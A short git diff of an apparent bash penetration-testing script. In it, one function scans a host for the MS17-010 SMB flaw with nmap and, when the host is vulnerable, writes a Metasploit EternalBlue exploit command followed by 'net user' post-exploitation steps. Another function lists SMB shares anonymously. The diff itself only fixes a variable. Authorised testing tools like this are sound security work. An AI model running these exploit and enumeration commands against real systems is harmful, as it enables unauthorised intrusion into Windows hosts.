@@ -244,7 +244,7 @@ function testeternalblue() {
     ip=$(echo $1 | cut -d "/" -f 3)
     eternalblueornot=$(nmap $ip --script=smb-vuln-ms17-010.nse)
     if echo $eternalblueornot | grep -qi "VULNERABLE"; then
-        echo "msfconsole -q -x \"use exploit/windows/smb/ms17_010_eternalblue; set rhosts $1; exploit;\"" >> $maybetry
+        echo "msfconsole -q -x \"use exploit/windows/smb/ms17_010_eternalblue; set rhosts $ip; exploit;\"" >> $maybetry
         echo "shell" >> $maybetry
         echo "net user" >> $maybetry
         echo "net user /domain" >> $maybetry
@@ -262,7 +262,7 @@ function checkfileshares() {
     mkdir -p $1/shares/
     smbclient -L \\$ip\\ -U anonymous -N > ${1}shares/all
     if grep -q 'session setup failed' ${1}shares/all; then
-        echo on ${1} there is probably a smb but no connection >> $maybetry
+        echo on ${ip} there is probably a smb but no connection >> $maybetry
     else
         cat ${1}shares/all | grep -a -v -E "Reconnecting|Unable|---------\s*----\s*-------|Sharename\s*Type\s*Comment" | awk '{$1=$1;print}' | cut -d " " -f 1 > ${1}shares/all.dbs
         while read p ; do
